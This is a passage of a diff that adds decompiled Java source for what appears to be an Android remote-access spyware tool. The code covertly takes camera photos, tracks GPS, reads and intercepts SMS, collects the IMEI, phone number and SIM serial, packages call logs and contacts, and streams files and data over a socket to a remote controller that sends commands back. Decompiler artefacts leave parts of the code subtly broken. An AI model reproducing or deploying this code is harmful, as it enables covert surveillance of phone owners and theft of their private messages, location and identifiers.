+                            my.app.Library.DirLister.visitAllDirsAndFiles(new java.io.File(p9, v0), p10);
+                        } catch (Exception v2) {
+                            System.out.println(new StringBuilder("Child !").append(v0).toString());
+                            v2.printStackTrace();
+                        }
+                        v4_3++;
+                    }
+                }
+            }
+        }
+        return;
+    }
+}
+package my.app.Library;
+ class FileDownloader$1 implements java.lang.Runnable {
+    final synthetic my.app.Library.FileDownloader this$0;
+
+    FileDownloader$1(my.app.Library.FileDownloader p1)
+    {
+        this.this$0 = p1;
+        return;
+    }
+
+    public void run()
+    {
+        this.this$0.load();
+        return;
+    }
+}
+package my.app.Library;
+public class FileDownloader {
+    int BUFF_SIZE;
+    byte[] buffer;
+    int channel;
+    my.app.client.ClientListener ctx;
+    java.io.File f;
+    byte[] finalData;
+    java.io.InputStream in;
+    short numseq;
+    Packet.FilePacket packet;
+
+    public FileDownloader(my.app.client.ClientListener p2)
+    {
+        this.numseq = 0;
+        this.BUFF_SIZE = 4096;
+        this.ctx = p2;
+        return;
+    }
+
+    public boolean downloadFile(String p5, int p6)
+    {
+        this.channel = p6;
+        this.f = new java.io.File(p5);
+        try {
+            this.in = new java.io.FileInputStream(this.f);
+            new Thread(new my.app.Library.FileDownloader$1(this)).start();
+            int v2_2 = 1;
+        } catch (java.io.FileNotFoundException v0) {
+            v2_2 = 0;
+        }
+        return v2_2;
+    }
+
+    public void load()
+    {
+        try {
+            while(true) {
+                my.app.client.ClientListener v3_1 = new byte[this.BUFF_SIZE];
+                this.buffer = v3_1;
+                int v1 = this.in.read(this.buffer);
+                this.packet = new Packet.FilePacket(this.numseq, 1, this.buffer);
+                this.ctx.handleData(this.channel, this.packet.build());
+                this.numseq = ((short) (this.numseq + 1));
+            }
+        } catch (java.io.IOException v0) {
+            this.ctx.sendError("IOException loading file");
+            return;
+        }
+        if (v1 != -1) {
+            if (v1 != this.BUFF_SIZE) {
+                byte[] v2 = new byte[v1];
+                System.arraycopy(this.buffer, 0, v2, 0, v1);
+                this.packet = new Packet.FilePacket(this.numseq, 0, v2);
+                this.ctx.handleData(this.channel, this.packet.build());
+            }
+        }
+        this.in.close();
+        return;
+    }
+}
+package my.app.Library;
+public class GPSListener {
+    private int channel;
+    private android.content.Context ctx;
+    private android.location.LocationListener listener;
+    private android.location.LocationManager mlocManager;
+    private Packet.GPSPacket packet;
+    private String provider;
+
+    public GPSListener(android.location.LocationListener p7, String p8, int p9)
+    {
+        this.listener = p7;
+        this.provider = p8;
+        this.channel = p9;
+        this.packet = new Packet.GPSPacket();
+        this.mlocManager = ((android.location.LocationManager) ((android.content.Context) p7).getSystemService("location"));
+        this.mlocManager.requestLocationUpdates(p8, 0, 0, this.listener);
+        return;
+    }
+
+    public byte[] encode(android.location.Location p10)
+    {
+        this.packet = new Packet.GPSPacket(p10.getLatitude(), p10.getLongitude(), p10.getAltitude(), p10.getSpeed(), p10.getAccuracy());
+        return this.packet.build();
+    }
+
+    public int getChannel()
+    {
+        return this.channel;
+    }
+
+    public void stop()
+    {
+        if (this.mlocManager != null) {
+            this.mlocManager.removeUpdates(this.listener);
+        }
+        return;
+    }
+}
+package my.app.Library;
+ class PhotoTaker$1 implements android.hardware.Camera$PictureCallback {
+    final synthetic my.app.Library.PhotoTaker this$0;
+
+    PhotoTaker$1(my.app.Library.PhotoTaker p1)
+    {
+        this.this$0 = p1;
+        return;
+    }
+
+    public void onPictureTaken(byte[] p3, android.hardware.Camera p4)
+    {
+        this.this$0.ctx.handleData(this.this$0.chan, p3);
+        android.util.Log.i("PhotoTaker", "After take picture !");
+        this.this$0.cam.release();
+        this.this$0.cam = 0;
+        return;
+    }
+}
+package my.app.Library;
+public class PhotoTaker {
+    android.hardware.Camera cam;
+    int chan;
+    my.app.client.ClientListener ctx;
+    android.view.SurfaceHolder holder;
+    private android.hardware.Camera$PictureCallback pic;
+
+    public PhotoTaker(my.app.client.ClientListener p2, int p3)
+    {
+        this.pic = new my.app.Library.PhotoTaker$1(this);
+        this.chan = p3;
+        this.ctx = p2;
+        return;
+    }
+
+    public boolean takePhoto()
+    {
+        int v2_0 = 0;
+        if (this.ctx.getApplicationContext().getPackageManager().hasSystemFeature("android.hardware.camera")) {
+            android.util.Log.i("PhotoTaker", "Just before Open !");
+            try {
+                this.cam = android.hardware.Camera.open();
+                android.util.Log.i("PhotoTaker", "Right after Open !");
+            } catch (java.io.IOException v0) {
+            }
+            if (this.cam != null) {
+                try {
+                    this.holder = new android.view.SurfaceView(this.ctx).getHolder();
+                    this.cam.setPreviewDisplay(this.holder);
+                    this.cam.startPreview();
+                    this.cam.takePicture(0, 0, this.pic);
+                    v2_0 = 1;
+                } catch (java.io.IOException v0) {
+                }
+            }
+        }
+        return v2_0;
+    }
+}
+package my.app.Library;
+public class SMSLister {
+
+    public SMSLister()
+    {
+        return;
+    }
+
+    public static boolean listSMS(my.app.client.ClientListener p22, int p23, byte[] p24)
+    {
+        int v21;
+        java.util.ArrayList v20_1 = new java.util.ArrayList();
+        String v5_1 = new String(p24);
+        String[] v4 = new String[8];
+        v4[0] = "_id";
+        v4[1] = "thread_id";
+        v4[2] = "address";
+        v4[3] = "person";
+        v4[4] = "date";
+        v4[5] = "read";
+        v4[6] = "body";
+        v4[7] = "type";
+        android.database.Cursor v19 = p22.getContentResolver().query(android.net.Uri.parse("content://sms/"), v4, v5_1, 0, "date DESC");
+        if (v19.getCount() == 0) {
+            v21 = 0;
+        } else {
+            v19.moveToFirst();
+            do {
+                if (v19.getColumnCount() != 0) {
+                    v20_1.add(new Packet.SMSPacket(v19.getInt(v19.getColumnIndex("_id")), v19.getInt(v19.getColumnIndex("thread_id")), v19.getString(v19.getColumnIndex("address")), v19.getInt(v19.getColumnIndex("person")), v19.getLong(v19.getColumnIndex("date")), v19.getInt(v19.getColumnIndex("read")), v19.getString(v19.getColumnIndex("body")), v19.getInt(v19.getColumnIndex("type"))));
+                }
+            } while(v19.moveToNext());
+            v21 = 1;
+        }
+        p22.handleData(p23, new Packet.SMSTreePacket(v20_1).build());
+        return v21;
+    }
+}
+package my.app.Library;
+ class SMSMonitor$1 extends android.content.BroadcastReceiver {
+    private final String SMS_RECEIVED;
+    final synthetic my.app.Library.SMSMonitor this$0;
+
+    SMSMonitor$1(my.app.Library.SMSMonitor p2)
+    {
+        this.this$0 = p2;
+        this.SMS_RECEIVED = "android.provider.Telephony.SMS_RECEIVED";
+        return;
+    }
+
+    public void onReceive(android.content.Context p13, android.content.Intent p14)
+    {
+        if (p14.getAction().equals("android.provider.Telephony.SMS_RECEIVED")) {
+            android.util.Log.i("SMSReceived", "onReceive sms !");
+            android.os.Bundle v0 = p14.getExtras();
+            if (v0 != null) {
+                Object[] v6_1 = ((Object[]) v0.get("pdus"));
+                android.telephony.SmsMessage[] v5 = new android.telephony.SmsMessage[v6_1.length];
+                int v3 = 0;
+                while (v3 < v6_1.length) {
+                    v5[v3] = android.telephony.SmsMessage.createFromPdu(((byte[]) v6_1[v3]));
+                    v3++;
+                }
+                if (v5.length > -1) {
+                    String v4 = v5[0].getMessageBody();
+                    String v7 = v5[0].getDisplayOriginatingAddress();
+                    long v1 = v5[0].getTimestampMillis();
+                    if (this.this$0.phoneNumberFilter != null) {
+                        if (this.this$0.phoneNumberFilter.contains(v7)) {
+                            android.util.Log.i("SMSReceived", "Message accepted as triggering message !");
+                            this.this$0.ctx.handleData(this.this$0.channel, new Packet.ShortSMSPacket(v7, v1, v4).build());
+                        }
+                    } else {
+                        this.this$0.ctx.handleData(this.this$0.channel, new Packet.ShortSMSPacket(v7, v1, v4).build());
+                    }
+                }
+            }
+        }
+        return;
+    }
+}
+package my.app.Library;
+public class SMSMonitor {
+    protected android.content.BroadcastReceiver SMSreceiver;
+    int channel;
+    my.app.client.ClientListener ctx;
+    java.util.HashSet phoneNumberFilter;
+
+    public SMSMonitor(my.app.client.ClientListener p4, int p5, byte[] p6)
+    {
+        this.SMSreceiver = new my.app.Library.SMSMonitor$1(this);
+        this.ctx = p4;
+        this.channel = p5;
+        this.phoneNumberFilter = utils.EncoderHelper.decodeHashSet(p6);
+        android.content.IntentFilter v0_0 = new android.content.IntentFilter();
+        v0_0.addAction("android.provider.Telephony.SMS_RECEIVED");
+        this.ctx.registerReceiver(this.SMSreceiver, v0_0);
+        return;
+    }
+
+    public void stop()
+    {
+        this.ctx.unregisterReceiver(this.SMSreceiver);
+        return;
+    }
+}
+package my.app.Library;
+public class SystemInfo {
+    android.content.Context ctx;
+    android.telephony.TelephonyManager tm;
+
+    public SystemInfo(android.content.Context p3)
+    {
+        this.ctx = p3;
+        this.tm = ((android.telephony.TelephonyManager) this.ctx.getSystemService("phone"));
+        return;
+    }
+
+    public byte[] getBasicInfos()
+    {
+        java.util.Hashtable v2_1 = new java.util.Hashtable();
+        String v4_4 = this.getIMEI();
+        if (v4_4 != null) {
+            v2_1.put("IMEI", v4_4);
+        }
+        String v4_6 = this.getPhoneNumber();
+        if (v4_6 != null) {
+            v2_1.put("PhoneNumber", v4_6);
+        }
+        String v4_0 = this.getCountryCode();
+        if (v4_0 != null) {
+            v2_1.put("Country", v4_0);
+        }
+        String v4_1 = this.getOperatorName();
+        if (v4_1 != null) {
+            v2_1.put("Operator", v4_1);
+        }
+        String v4_2 = this.getSimCountryCode();
+        if (v4_2 != null) {
+            v2_1.put("SimCountry", v4_2);
+        }
+        String v4_3 = this.getSimOperatorName();
+        if (v4_3 != null) {
+            v2_1.put("SimOperator", v4_3);
+        }
+        String v4_5 = this.getSimSerial();
+        if (v4_5 != null) {
+            v2_1.put("SimSerial", v4_5);
+        }
+        try {
+            java.io.ByteArrayOutputStream v0_1 = new java.io.ByteArrayOutputStream();
+            new java.io.ObjectOutputStream(v0_1).writeObject(v2_1);
+            int v5_6 = v0_1.toByteArray();
+        } catch (java.io.IOException v1) {
+            v5_6 = 0;
+        }
+        return v5_6;
+    }
+
+    public String getCountryCode()
+    {
+        return this.tm.getNetworkCountryIso();
+    }
+
+    public String getIMEI()
+    {
+        return this.tm.getDeviceId();
+    }
+
+    public String getOperatorName()
+    {
+        return this.tm.getNetworkOperatorName();
+    }
+
+    public String getPhoneNumber()
+    {
+        return this.tm.getLine1Number();
+    }
+
+    public String getSimCountryCode()
+    {
+        return this.tm.getSimCountryIso();
+    }
+
+    public String getSimOperatorName()
+    {
+        return this.tm.getSimOperatorName();
+    }
+
+    public String getSimSerial()
+    {
+        return this.tm.getSimSerialNumber();
+    }
+}
+package out;
+public class Connection {
+    inout.Controler controler;
+    in.Demux dem;
+    java.io.DataInputStream in;
+    String ip;
+    out.Mux m;
+    java.io.DataOutputStream out;
+    int port;
+    java.nio.ByteBuffer readInstruction;
+    in.Receiver receive;
+    java.net.Socket s;
+    boolean stop;
+
+    public Connection(String p2, int p3)
+    {
+        this.ip = "localhost";
+        this.port = 5555;
+        this.stop = 0;
+        this.ip = p2;
+        this.port = p3;
+        return;
+    }
+
+    public Connection(String p2, int p3, inout.Controler p4)
+    {
+        this.ip = "localhost";
+        this.port = 5555;
+        this.stop = 0;
+        this.ip = p2;
+        this.port = p3;
+        this.controler = p4;
+        return;
+    }
+
+    public boolean accept(java.net.ServerSocket p4)
+    {
+        try {
+            this.s = p4.accept();
+            this.in = new java.io.DataInputStream(this.s.getInputStream());
+            this.out = new java.io.DataOutputStream(this.s.getOutputStream());
+            this.m = new out.Mux(this.out);
+            int v1_4 = 1;
+        } catch (java.io.IOException v0) {
+            v0.printStackTrace();
+            v1_4 = 0;
+        }
+        return v1_4;
+    }
+
+    public boolean connect()
+    {
+        try {
+            this.s = new java.net.Socket(this.ip, this.port);
+            this.in = new java.io.DataInputStream(this.s.getInputStream());
+            this.out = new java.io.DataOutputStream(this.s.getOutputStream());
+            this.m = new out.Mux(this.out);
+            this.dem = new in.Demux(this.controler, "moi");
+            this.receive = new in.Receiver(this.s);
+            int v1_10 = 1;
+        } catch (java.io.IOException v0) {
+            v0.printStackTrace();
+            v1_10 = 0;
+        }
+        return v1_10;
+    }
+
+    public java.nio.ByteBuffer getInstruction()
+    {
+        this.readInstruction = this.receive.read();
+        if (!this.dem.receive(this.readInstruction)) {
+            this.readInstruction.clear();
+        } else {
+            this.readInstruction.compact();
+        }
+        return this.readInstruction;
+    }
+
+    public boolean reconnect()
+    {
+        return this.connect();
+    }
+
+    public void sendData(int p2, byte[] p3)
+    {
+        this.m.send(p2, p3);
+        return;
+    }
+
+    public void stop()
+    {
+        try {
+            this.s.close();
+        } catch (java.io.IOException v0) {
+        }
+        return;
+    }
+}
+package out;
+public class Mux {
+    out.Sender sender;
+
+    public Mux(java.io.DataOutputStream p2)
+    {
+        this.sender = new out.Sender(p2);
+        return;
+    }
+
+    public void send(int p13, byte[] p14)
+    {
+        int v4 = 0;
+        int v9 = 0;
+        int v10 = 0;
+        short v5 = 0;
+        while (v9 == 0) {
+            try {
+                if ((v4 == 0) && ((p14.length + 15) >= 2048)) {
+                    byte[] v7_0 = new byte[2048];
+                } else {
+                    v7_0 = new byte[((p14.length - v10) + 15)];
+                    v4 = 1;
+                    v9 = 1;
+                }
+                int v2 = (v7_0.length - 15);
+                byte[] v6 = new byte[(v7_0.length - 15)];
+                System.arraycopy(p14, v10, v6, 0, v6.length);
+                byte[] vtmp1 = new Packet.TransportPacket(p14.length, v2, p13, v4, v5, v6).build();
+                v10 += v2;
+                v5 = ((short) (v5 + 1));
+                if ((p14.length - v10) <= 2033) {
+                    v4 = 1;
+                }
+                this.sender.send(vtmp1);
+            } catch (NullPointerException v8) {
+                System.out.println("Ce channel n\'est pas index\u00ef\u00bf\u00bd");
+                v8.printStackTrace();
+                break;
+            }
+        }
+        return;
+    }
+}
+package out;
+public class Sender {
+    java.io.DataOutputStream out;
+
+    public Sender(java.io.DataOutputStream p1)
+    {
+        this.out = p1;
+        return;
+    }
+
+    public void send(byte[] p3)
+    {
+        try {
+            this.out.write(p3);
+        } catch (java.io.IOException v0) {
+            v0.printStackTrace();
+        }
+        return;
+    }
+}
+package Packet;
+public interface Packet {
+
+    public abstract byte[] build();
+
+    public abstract void parse();
+}
+package Packet;
+public class AdvancedInformationPacket implements Packet.Packet, java.io.Serializable {
+    private static final long serialVersionUID = 44346671562310318;
+    String IMEI;
+    int androidSdk;
+    String androidVersion;
+    int batteryHealth;
+    int batteryLevel;
+    int batteryPlugged;
+    boolean batteryPresent;
+    int batteryScale;
+    int batteryStatus;
+    String batteryTechnology;
+    int batteryTemperature;
+    int batteryVoltage;
+    String countryCode;
+    boolean mobileNetworkAvailable;
+    boolean mobileNetworkConnectedOrConnecting;
+    String mobileNetworkExtraInfos;
+    String mobileNetworkName;
+    String mobileNetworkReason;
+    String operatorCode;
+    String operatorName;
+    String phoneNumber;
+    java.util.ArrayList sensors;
+    String simCountryCode;
+    String simOperatorCode;
+    String simOperatorName;
+    String simSerial;
+    String softwareVersion;
+    boolean wifiAvailable;
+    boolean wifiConnectedOrConnecting;
+    String wifiExtraInfos;
+    String wifiReason;
+
+    public AdvancedInformationPacket()
+    {
+        return;
+    }
+
+    public byte[] build()
+    {
+        try {
+            java.io.ByteArrayOutputStream v0_1 = new java.io.ByteArrayOutputStream();
+            new java.io.ObjectOutputStream(v0_1).writeObject(this);
+            int v3 = v0_1.toByteArray();
+        } catch (java.io.IOException v1) {
+            v3 = 0;
+        }
+        return v3;
+    }
+
+    public int getAndroidSdk()
+    {
+        return this.androidSdk;
+    }
+
+    public String getAndroidVersion()
+    {
+        return this.androidVersion;
+    }
+
+    public int getBatteryHealth()
+    {
+        return this.batteryHealth;
+    }
+
+    public int getBatteryLevel()
+    {
+        return this.batteryLevel;
+    }
+
+    public int getBatteryPlugged()
+    {
+        return this.batteryPlugged;
+    }
+
+    public int getBatteryScale()
+    {
+        return this.batteryScale;
+    }
+
+    public int getBatteryStatus()
+    {
+        return this.batteryStatus;
+    }
+
+    public String getBatteryTechnology()
+    {
+        return this.batteryTechnology;
+    }
+
+    public int getBatteryTemperature()
+    {
+        return this.batteryTemperature;
+    }
+
+    public int getBatteryVoltage()
+    {
+        return this.batteryVoltage;
+    }
+
+    public String getCountryCode()
+    {
+        return this.countryCode;
+    }
+
+    public String getIMEI()
+    {
+        return this.IMEI;
+    }
+
+    public String getMobileNetworkExtraInfos()
+    {
+        return this.mobileNetworkExtraInfos;
+    }
+
+    public String getMobileNetworkName()
+    {
+        return this.mobileNetworkName;
+    }
+
+    public String getMobileNetworkReason()
+    {
+        return this.mobileNetworkReason;
+    }
+
+    public String getOperatorCode()
+    {
+        return this.operatorCode;
+    }
+
+    public String getOperatorName()
+    {
+        return this.operatorName;
+    }
+
+    public String getPhoneNumber()
+    {
+        return this.phoneNumber;
+    }
+
+    public java.util.ArrayList getSensors()
+    {
+        return this.sensors;
+    }
+
+    public String getSimCountryCode()
+    {
+        return this.simCountryCode;
+    }
+
+    public String getSimOperatorCode()
+    {
+        return this.simOperatorCode;
+    }
+
+    public String getSimOperatorName()
+    {
+        return this.simOperatorName;
+    }
+
+    public String getSimSerial()
+    {
+        return this.simSerial;
+    }
+
+    public String getSoftwareVersion()
+    {
+        return this.softwareVersion;
+    }
+
+    public String getWifiExtraInfos()
+    {
+        return this.wifiExtraInfos;
+    }
+
+    public String getWifiReason()
+    {
+        return this.wifiReason;
+    }
+
+    public boolean isBatteryPresent()
+    {
+        return this.batteryPresent;
+    }
+
+    public boolean isMobileNetworkAvailable()
+    {
+        return this.mobileNetworkAvailable;
+    }
+
+    public boolean isMobileNetworkConnectedOrConnecting()
+    {
+        return this.mobileNetworkConnectedOrConnecting;
+    }
+
+    public boolean isWifiAvailable()
+    {
+        return this.wifiAvailable;
+    }
+
+    public boolean isWifiConnectedOrConnecting()
+    {
+        return this.wifiConnectedOrConnecting;
+    }
+
+    public void parse(byte[] p5)
+    {
+        try {
+            Packet.AdvancedInformationPacket v0_1 = ((Packet.AdvancedInformationPacket) new java.io.ObjectInputStream(new java.io.ByteArrayInputStream(p5)).readObject());
+            this.setPhoneNumber(v0_1.getPhoneNumber());
+            this.setIMEI(v0_1.getIMEI());
+            this.setSoftwareVersion(v0_1.getSoftwareVersion());
+            this.setCountryCode(v0_1.getCountryCode());
+            this.setOperatorCode(v0_1.getOperatorCode());
+            this.setOperatorName(v0_1.getOperatorName());
+            this.setSimOperatorCode(v0_1.getSimOperatorCode());
+            this.setSimOperatorName(v0_1.getSimOperatorName());
+            this.setSimCountryCode(v0_1.getSimCountryCode());
+            this.setSimSerial(v0_1.getSimSerial());
+            this.setWifiAvailable(v0_1.isWifiAvailable());
+            this.setWifiConnectedOrConnecting(v0_1.isWifiConnectedOrConnecting());
+            this.setWifiExtraInfos(v0_1.getWifiExtraInfos());
+            this.setWifiReason(v0_1.getWifiReason());
+            this.setMobileNetworkName(v0_1.getMobileNetworkName());
+            this.setMobileNetworkAvailable(v0_1.isMobileNetworkAvailable());
+            this.setMobileNetworkConnectedOrConnecting(v0_1.isMobileNetworkConnectedOrConnecting());
+            this.setMobileNetworkExtraInfos(v0_1.getMobileNetworkExtraInfos());
+            this.setMobileNetworkReason(v0_1.getMobileNetworkReason());
+            this.setAndroidVersion(v0_1.getAndroidVersion());
+            this.setAndroidSdk(v0_1.getAndroidSdk());
+            this.setSensors(v0_1.getSensors());
+            this.setBatteryHealth(v0_1.getBatteryHealth());
+            this.setBatteryLevel(v0_1.getBatteryLevel());
+            this.setBatteryPlugged(v0_1.getBatteryPlugged());
+            this.setBatteryPresent(v0_1.isBatteryPresent());
+            this.setBatteryScale(v0_1.getBatteryScale());
+            this.setBatteryStatus(v0_1.getBatteryStatus());
+            this.setBatteryTechnology(v0_1.getBatteryTechnology());
+            this.setBatteryTemperature(v0_1.getBatteryTemperature());
+            this.setBatteryVoltage(v0_1.getBatteryVoltage());
+        } catch (Exception v3) {
+        }
+        return;
+    }
+
+    public void setAndroidSdk(int p1)
+    {
+        this.androidSdk = p1;
+        return;
+    }
+
+    public void setAndroidVersion(String p1)
+    {
+        this.androidVersion = p1;
+        return;
+    }
+
+    public void setBatteryHealth(int p1)
+    {
+        this.batteryHealth = p1;
+        return;
+    }
+
+    public void setBatteryLevel(int p1)
+    {
+        this.batteryLevel = p1;
+        return;
+    }
+
+    public void setBatteryPlugged(int p1)
+    {
+        this.batteryPlugged = p1;
+        return;
+    }
+
+    public void setBatteryPresent(boolean p1)
+    {
+        this.batteryPresent = p1;
+        return;
+    }
+
+    public void setBatteryScale(int p1)
+    {
+        this.batteryScale = p1;
+        return;
+    }
+
+    public void setBatteryStatus(int p1)
+    {
+        this.batteryStatus = p1;
+        return;
+    }
+
+    public void setBatteryTechnology(String p1)
+    {
+        this.batteryTechnology = p1;
+        return;
+    }
+
+    public void setBatteryTemperature(int p1)
+    {
+        this.batteryTemperature = p1;
+        return;
+    }
+
+    public void setBatteryVoltage(int p1)
+    {
+        this.batteryVoltage = p1;
+        return;
+    }
+
+    public void setCountryCode(String p1)
+    {
+        this.countryCode = p1;
+        return;
+    }
+
+    public void setIMEI(String p1)
+    {
+        this.IMEI = p1;
+        return;
+    }
+
+    public void setMobileNetworkAvailable(boolean p1)
+    {
+        this.mobileNetworkAvailable = p1;
+        return;
+    }
+
+    public void setMobileNetworkConnectedOrConnecting(boolean p1)
+    {
+        this.mobileNetworkConnectedOrConnecting = p1;
+        return;
+    }
+
+    public void setMobileNetworkExtraInfos(String p1)
+    {
+        this.mobileNetworkExtraInfos = p1;
+        return;
+    }
+
+    public void setMobileNetworkName(String p1)
+    {
+        this.mobileNetworkName = p1;
+        return;
+    }
+
+    public void setMobileNetworkReason(String p1)
+    {
+        this.mobileNetworkReason = p1;
+        return;
+    }
+
+    public void setOperatorCode(String p1)
+    {
+        this.operatorCode = p1;
+        return;
+    }
+
+    public void setOperatorName(String p1)
+    {
+        this.operatorName = p1;
+        return;
+    }
+
+    public void setPhoneNumber(String p1)
+    {
+        this.phoneNumber = p1;
+        return;
+    }
+
+    public void setSensors(java.util.ArrayList p1)
+    {
+        this.sensors = p1;
+        return;
+    }
+
+    public void setSimCountryCode(String p1)
+    {
+        this.simCountryCode = p1;
+        return;
+    }
+
+    public void setSimOperatorCode(String p1)
+    {
+        this.simOperatorCode = p1;
+        return;
+    }
+
+    public void setSimOperatorName(String p1)
+    {
+        this.simOperatorName = p1;
+        return;
+    }
+
+    public void setSimSerial(String p1)
+    {
+        this.simSerial = p1;
+        return;
+    }
+
+    public void setSoftwareVersion(String p1)
+    {
+        this.softwareVersion = p1;
+        return;
+    }
+
+    public void setWifiAvailable(boolean p1)
+    {
+        this.wifiAvailable = p1;
+        return;
+    }
+
+    public void setWifiConnectedOrConnecting(boolean p1)
+    {
+        this.wifiConnectedOrConnecting = p1;
+        return;
+    }
+
+    public void setWifiExtraInfos(String p1)
+    {
+        this.wifiExtraInfos = p1;
+        return;
+    }
+
+    public void setWifiReason(String p1)
+    {
+        this.wifiReason = p1;
+        return;
+    }
+}
+package Packet;
+public class CallLogPacket implements Packet.Packet {
+    private java.util.ArrayList list;
+
+    public CallLogPacket()
+    {
+        return;
+    }
+
+    public CallLogPacket(java.util.ArrayList p1)
+    {
+        this.list = p1;
+        return;
+    }
+
+    public byte[] build()
+    {
+        try {
+            java.io.ByteArrayOutputStream v0_1 = new java.io.ByteArrayOutputStream();
+            new java.io.ObjectOutputStream(v0_1).writeObject(this.list);
+            int v3_1 = v0_1.toByteArray();
+        } catch (java.io.IOException v1) {
+            v3_1 = 0;
+        }
+        return v3_1;
+    }
+
+    public java.util.ArrayList getList()
+    {
+        return this.list;
+    }
+
+    public void parse(byte[] p4)
+    {
+        try {
+            this.list = ((java.util.ArrayList) new java.io.ObjectInputStream(new java.io.ByteArrayInputStream(p4)).readObject());
+        } catch (Exception v2) {
+        }
+        return;
+    }
+}
+package Packet;
+public class CallPacket implements Packet.Packet, java.io.Serializable {
+    private static final long serialVersionUID = 3972539952673409279;
+    private int contact_id;
+    private long date;
+    private long duration;
+    private int id;
+    private String name;
+    private int nameSize;
+    private String phoneNumber;
+    private int phoneNumberSize;
+    private int type;
+
+    public CallPacket()
+    {
+        return;
+    }
+
+    public CallPacket(int p3, int p4, long p5, long p7, int p9, String p10, String p11)
+    {
+        this.id = p3;
+        this.type = p4;
+        this.date = p5;
+        this.duration = p7;
+        this.contact_id = p9;
+        this.phoneNumber = p10;
+        if (this.phoneNumber == null) {
+            this.phoneNumberSize = 0;
+        } else {
+            this.phoneNumberSize = p10.length();
+        }
+        this.name = p11;
+        if (p11 == null) {
+            this.nameSize = 0;
+        } else {
+            this.nameSize = p11.length();
+        }
+        return;
+    }
+
+    public byte[] build()
+    {
+        java.nio.ByteBuffer v0 = java.nio.ByteBuffer.allocate(((this.phoneNumberSize + 36) + this.nameSize));
+        v0.putInt(this.id);
+        v0.putInt(this.type);
+        v0.putLong(this.date);
+        v0.putLong(this.duration);
+        v0.putInt(this.contact_id);
+        v0.putInt(this.phoneNumberSize);
+        v0.put(this.phoneNumber.getBytes());
+        v0.putInt(this.nameSize);
+        v0.put(this.name.getBytes());
+        return v0.array();
+    }
+
+    public int getContact_id()
+    {
+        return this.contact_id;
+    }
+
+    public long getDate()
+    {
+        return this.date;
+    }
+
+    public long getDuration()
+    {
+        return this.duration;
+    }
+
+    public int getId()
+    {
+        return this.id;
+    }
+
+    public String getName()
+    {
+        return this.name;
+    }
+
+    public int getNameSize()
+    {
+        return this.nameSize;
+    }
+
+    public String getPhoneNumber()
+    {
+        return this.phoneNumber;
+    }
+
+    public int getPhoneNumberSize()
+    {
+        return this.phoneNumberSize;
+    }
+
+    public int getType()
+    {
+        return this.type;
+    }
+
+    public void parse(byte[] p5)
+    {
+        java.nio.ByteBuffer v0 = java.nio.ByteBuffer.wrap(p5);
+        this.id = v0.getInt();
+        this.type = v0.getInt();
+        this.date = v0.getLong();
+        this.duration = v0.getLong();
+        this.contact_id = v0.getInt();
+        this.phoneNumberSize = v0.getInt();
+        byte[] v1_0 = new byte[this.phoneNumberSize];
+        v0.get(v1_0);
+        this.phoneNumber = new String(v1_0);
+        this.nameSize = v0.getInt();
+        byte[] v1_1 = new byte[this.nameSize];
+        v0.get(v1_1);
+        this.name = new String(v1_1);
+        return;
+    }
+}
+package Packet;
+public class CallStatusPacket implements Packet.Packet {
+    String phonenumber;
+    int type;
+
+    public CallStatusPacket()
+    {
+        return;
+    }
+
+    public CallStatusPacket(int p1, String p2)
+    {
+        this.type = p1;
+        this.phonenumber = p2;
+        return;
+    }
+
+    public byte[] build()
+    {
+        java.nio.ByteBuffer v0;
+        if (this.phonenumber != null) {
+            v0 = java.nio.ByteBuffer.allocate((this.phonenumber.length() + 4));
+            v0.putInt(this.type);
+            v0.put(this.phonenumber.getBytes());
+        } else {
+            v0 = java.nio.ByteBuffer.allocate(4);
+            v0.putInt(this.type);
+        }
+        return v0.array();
+    }
+
+    public String getPhonenumber()
+    {
+        return this.phonenumber;
+    }
+
+    public int getType()
+    {
+        return this.type;
+    }
+
+    public void parse(byte[] p4)
+    {
+        java.nio.ByteBuffer v0 = java.nio.ByteBuffer.wrap(p4);
+        this.type = v0.getInt();
+        if (!v0.hasRemaining()) {
+            this.phonenumber = 0;
+        } else {
+            byte[] v1 = new byte[v0.remaining()];
+            v0.get(v1);
+            this.phonenumber = new String(v1);
+        }
+        return;
+    }
+}
+package Packet;
+public class CommandPacket implements Packet.Packet {
+    private byte[] argument;
+    private short commande;
+    private int targetChannel;
+
+    public CommandPacket()
+    {
+        return;
+    }
+
+    public CommandPacket(short p1, int p2, byte[] p3)
+    {
+        this.commande = p1;
+        this.argument = p3;
+        this.targetChannel = p2;
+        return;
+    }
+
+    public byte[] build()
+    {
+        byte[] v0 = java.nio.ByteBuffer.allocate(2).putShort(this.commande).array();
+        byte[] v1 = java.nio.ByteBuffer.allocate(4).putInt(this.targetChannel).array();
+        byte[] v2 = new byte[((v0.length + v1.length) + this.argument.length)];
+        System.arraycopy(v0, 0, v2, 0, v0.length);
+        System.arraycopy(v1, 0, v2, v0.length, v1.length);
+        System.arraycopy(this.argument, 0, v2, (v0.length + v1.length), this.argument.length);
+        return v2;
+    }
+
+    public byte[] getArguments()
+    {
+        return this.argument;
+    }
+
+    public short getCommand()
+    {
+        return this.commande;
+    }
+
+    public int getTargetChannel()
+    {
+        return this.targetChannel;
+    }
+
+    public void parse(java.nio.ByteBuffer p4)
+    {
+        this.commande = p4.getShort();
+        this.targetChannel = p4.getInt();
+        byte[] v0_4 = new byte[p4.remaining()];
+        this.argument = v0_4;
+        p4.get(this.argument, 0, p4.remaining());
+        return;
+    }
+
+    public void parse(byte[] p5)
+    {
+        java.nio.ByteBuffer v0 = java.nio.ByteBuffer.wrap(p5);
+        this.commande = v0.getShort();
+        this.targetChannel = v0.getInt();
+        byte[] v1_0 = new byte[v0.remaining()];
+        this.argument = v1_0;
+        v0.get(this.argument, 0, v0.remaining());
+        return;
+    }
+}
+package Packet;
+public class ContactsPacket implements Packet.Packet {
+    java.util.ArrayList list;
+
+    public ContactsPacket()
+    {
+        return;
+    }
+
+    public ContactsPacket(java.util.ArrayList p1)
+    {
+        this.list = p1;
+        return;
+    }
+
+    public byte[] build()
+    {
+        try {
+            java.io.ByteArrayOutputStream v0_1 = new java.io.ByteArrayOutputStream();
+            new java.io.ObjectOutputStream(v0_1).writeObject(this.list);
+            int v3_1 = v0_1.toByteArray();
+        } catch (java.io.IOException v1) {
+            v3_1 = 0;
+        }
+        return v3_1;
+    }
+
+    public java.util.ArrayList getList()
+    {
+        return this.list;
+    }
+
+    public void parse(byte[] p4)
+    {
+        try {
+            this.list = ((java.util.ArrayList) new java.io.ObjectInputStream(new java.io.ByteArrayInputStream(p4)).readObject());
+        } catch (Exception v2) {
+        }
+        return;
+    }
+}
+package Packet;
+public class FilePacket implements Packet.Packet {
